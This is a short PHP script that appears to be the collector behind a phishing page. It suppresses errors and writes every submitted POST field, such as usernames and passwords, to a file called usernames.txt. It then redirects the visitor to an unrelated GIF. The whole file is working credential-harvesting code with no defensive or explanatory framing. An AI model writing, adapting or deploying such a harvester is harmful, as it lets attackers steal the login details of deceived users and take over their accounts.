<?php
error_reporting(0);
$DataToSave = "";
if ($_POST) {
foreach ($_POST as $key => $value) {
$DataToSave.= " $key : " . $value . "\n";
}
file_put_contents("usernames.txt", "$DataToSave", FILE_APPEND);
header('Location: https://thumbs.gfycat.com/FewHonorableGrasshopper-size_restricted.gif');
exit();
}
